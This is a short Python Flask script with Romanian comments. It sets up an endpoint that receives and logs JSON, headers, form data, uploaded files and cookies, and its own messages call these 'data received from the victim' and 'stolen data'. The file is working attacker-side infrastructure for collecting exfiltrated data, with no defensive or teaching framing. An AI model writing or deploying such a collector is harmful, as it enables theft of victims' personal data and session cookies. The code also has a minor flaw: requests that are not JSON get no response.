from flask import Flask, request
import logging

# Configurare log pentru salvarea în fișier
logging.basicConfig(filename='server.log', level=logging.DEBUG, 
                    format='%(asctime)s %(levelname)s %(message)s')

app = Flask(__name__)

# Mesaj de debug pentru a confirma că serverul pornește corect
print("Serverul Flask a pornit!")

@app.route('/api/date', methods=['GET', 'POST'])
def api_date():
    # Înregistrare detalii ale cererii în log
  if request.is_json:
    data = request.json
    app.logger.info(f'Date primite de la victimă: {data}')  
    app.logger.info("Metoda HTTP: %s", request.method)
    app.logger.info("Header-ele HTTP: %s", request.headers)
    app.logger.info("Parametri URL (query params): %s", request.args)
    app.logger.info("Conținut formular (body): %s", request.form)
    app.logger.info("Fișiere încărcate: %s", request.files)
    app.logger.info("Valori combinate din request.args și request.form: %s", request.values)
    app.logger.info("Conținut JSON (dacă există): %s", request.json)
    app.logger.info("Cookie-urile trimise: %s", request.cookies)

    # Afișează datele pentru confirmare
    print("Date furate:", data)
    return '', 204  # răspuns OK

if __name__ == '__main__':
    # Aceasta linie va confirma că serverul Flask a început
    app.run(port=5001)
